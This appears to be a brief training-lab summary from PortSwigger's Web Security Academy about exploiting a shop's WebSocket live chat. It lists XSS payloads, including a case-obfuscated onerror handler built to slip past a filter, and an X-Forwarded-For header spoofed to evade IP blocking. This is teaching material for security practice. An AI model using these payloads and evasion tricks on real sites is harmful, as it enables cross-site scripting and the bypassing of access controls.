## Manipulating the WebSocket handshake to exploit vulnerabilities

**Category:** websockets
**Difficulty:** Unknown

### Description
This online shop has a live chat feature implemented using WebSockets.

### Solution Steps
If you're struggling to bypass the XSS filter, try out our
XSS labs
.
Sometimes you can bypass IP-based restrictions using HTTP headers like
X-Forwarded-For
.

### Key Payloads
- `alert()`
- `X-Forwarded-For`
- `<img src=1 onerror='alert(1)'>`
- `X-Forwarded-For: 1.1.1.1`
- `<img src=1 oNeRrOr=alert\`1\`>`

### Indicators of Success
- WebSocket messages manipulated
- XSS via WebSocket message injection
- Authentication bypass on WebSocket
- CSWSH (Cross-Site WebSocket Hijacking)
- Message integrity violated
---
*Source: PortSwigger Web Security Academy*
